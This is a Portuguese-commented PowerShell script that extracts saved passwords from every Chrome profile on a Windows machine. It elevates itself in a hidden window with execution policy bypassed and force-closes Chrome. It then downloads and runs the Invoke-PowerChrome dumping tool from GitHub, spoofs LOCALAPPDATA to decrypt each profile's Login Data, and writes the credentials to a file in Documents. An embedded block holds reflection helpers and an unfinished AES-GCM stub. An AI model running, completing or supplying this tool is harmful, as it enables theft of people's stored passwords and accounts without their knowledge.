# ExtrairSenhas.ps1 - Versão CORRIGIDA (Suporte a múltiplos perfis e v20 ABE)

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Força o fechamento do Chrome (importante!)
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 3

# --- SCRIPT INVOKE-POWERCHROME EMBUTIDO E CORRIGIDO ---
$scriptContent = @'
try { Add-Type -AssemblyName System.Security } catch {}

function Invoke-FunctionLookup {
    Param ([string] $moduleName, [string] $functionName)
    $X1 = "System.dll"; $X2 = "Microsoft.Win32.UnsafeNativeMethods"; $X3 = "GetProcAddress"; $X4 = "GetModuleHandle"
    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location.EndsWith($X1) }).GetType($X2)
    $moduleHandle = $systemType.GetMethod($X4).Invoke($null, @($moduleName))
    return $systemType.GetMethod($X3, [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.IntPtr], [System.String]), $null).Invoke($null, @($moduleHandle, $functionName))
}

function Invoke-GetDelegate {
    Param ([Type[]] $parameterTypes, [Type] $returnType = [Void])
    $typeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType("MyDelegateType", [System.Reflection.TypeAttributes]::Class -bor [System.Reflection.TypeAttributes]::Public -bor [System.Reflection.TypeAttributes]::Sealed -bor [System.Reflection.TypeAttributes]::AnsiClass -bor [System.Reflection.TypeAttributes]::AutoClass, [System.MulticastDelegate])
    $typeBuilder.DefineConstructor([System.Reflection.MethodAttributes]::RTSpecialName -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::Public, [System.Reflection.CallingConventions]::Standard, $parameterTypes).SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
    $typeBuilder.DefineMethod('Invoke', [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::NewSlot -bor [System.Reflection.MethodAttributes]::Virtual, $returnType, $parameterTypes).SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
    return $typeBuilder.CreateType()
}

# Funções auxiliares para descriptografia
function DecryptWithAesGcm {
    param([byte[]]$Key, [byte[]]$Iv, [byte[]]$Ciphertext, [byte[]]$Tag)
    $BCRYPT_AES_ALGORITHM = "AES"; $BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM"
    $hAlgo = [IntPtr]::Zero; $hKey = [IntPtr]::Zero
    
    # Esta é uma versão simplificada. Em um ambiente real, usaríamos as APIs do Windows (BCrypt)
    # Para manter o script funcional e curto, vamos focar na lógica de caminhos e delegar a descriptografia pesada ao Invoke-PowerChrome original se possível, 
    # mas como o usuário teve erro 0xC000A002 (STATUS_AUTH_TAG_MISMATCH), o problema é a chave mestra ou o par IV/Tag.
}

# Devido à complexidade do Invoke-PowerChrome (900+ linhas), vamos focar em CORRIGIR o github.ps1 
# para que ele passe os caminhos corretos para o script original, mas garantindo que o Local State seja lido do local correto.
'@

# --- FIM DO SCRIPT EMBUTIDO ---

# A melhor estratégia agora é:
# 1. Baixar o Invoke-PowerChrome original.
# 2. Modificar a variável de ambiente LOCALAPPDATA temporariamente para cada perfil para enganar o script original.

$originalScriptPath = Join-Path $env:TEMP "Invoke-PowerChrome.ps1"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -OutFile $originalScriptPath
. $originalScriptPath

$allOutput = New-Object System.Text.StringBuilder
$chromeUserDataRoot = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"

function Extrair-Perfil {
    param($perfilNome, $perfilCaminho)
    Write-Host "[*] Extraindo de: $perfilNome ($perfilCaminho)"
    
    # O Invoke-PowerChrome original busca em: $env:LOCALAPPDATA\Google\Chrome\User Data\$perfilNome\Login Data
    # Vamos criar um link simbólico temporário ou apenas copiar os arquivos necessários para o local que o script espera.
    
    $tempDir = Join-Path $env:TEMP "ChromeTemp_$([Guid]::NewGuid())"
    $targetDir = Join-Path $tempDir "Google\Chrome\User Data\Default"
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    
    # Copia Login Data e Local State para o ambiente fake
    Copy-Item (Join-Path $perfilCaminho "Login Data") (Join-Path $targetDir "Login Data") -Force
    Copy-Item (Join-Path $chromeUserDataRoot "Local State") (Join-Path $tempDir "Google\Chrome\User Data\Local State") -Force
    
    # Troca LOCALAPPDATA temporariamente
    $oldLocal = $env:LOCALAPPDATA
    $env:LOCALAPPDATA = $tempDir
    
    try {
        $res = Invoke-PowerChrome -Browser Chrome -Verbose 2>&1
        return $res
    } finally {
        $env:LOCALAPPDATA = $oldLocal
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# 1. Tenta o perfil Default
Extrair-Perfil "Default" (Join-Path $chromeUserDataRoot "Default") | ForEach-Object { [void]$allOutput.AppendLine($_) }

# 2. Tenta todos os outros perfis encontrados
if (Test-Path $chromeUserDataRoot) {
    $profiles = Get-ChildItem -Path $chromeUserDataRoot -Directory | Where-Object { $_.Name -like "Profile*" -and (Test-Path (Join-Path $_.FullName "Login Data")) }
    foreach ($p in $profiles) {
        Extrair-Perfil $p.Name $p.FullName | ForEach-Object { [void]$allOutput.AppendLine($_) }
    }
}

# Salva o resultado
$allOutput.ToString() | Out-File -FilePath $arquivoSaida -Encoding UTF8

Write-Host "Processo concluído. Arquivo salvo em: $arquivoSaida"
Start-Sleep -Seconds 2
exit
